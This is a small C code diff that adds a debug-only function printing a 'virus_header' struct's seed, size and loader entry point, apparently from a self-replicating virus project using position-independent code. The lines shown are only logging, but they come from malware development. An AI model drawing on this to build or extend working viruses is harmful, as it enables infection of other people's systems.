@@ -12,6 +12,7 @@
 
 #ifdef DEBUG
 
+#include "loader.h"
 #include "utils.h"
 #include "position_independent.h"
 
@@ -57,6 +58,18 @@ void	log_all_seeds(const uint64_t father_seed, const uint64_t hdr_hash, const ui
 	putu64(hdr_hash);
 	putstr(rpar);
 	putstr(newline);
+}
+
+void	log_virus_header(struct virus_header *vhdr)
+{
+	PD_ARRAY(char, newline, '\n',0);
+	PD_ARRAY(char, seed, '[','L','O','G',']',' ','s','e','e','d',':',' ',0);
+	PD_ARRAY(char, virus_size, '[','L','O','G',']',' ','v','i','r','u','s','_','s','i','z','e',':',' ',0);
+	PD_ARRAY(char, loader_entry, '[','L','O','G',']',' ','l','o','a','d','e','r','_','e','n','t','r','y',':',' ',0);
+
+	putstr(seed); putu64(vhdr->seed); putstr(newline);
+	putstr(virus_size); putu64(vhdr->virus_size); putstr(newline);
+	putstr(loader_entry); putu64((size_t)vhdr->loader_entry); putstr(newline);
 }
 
 #endif
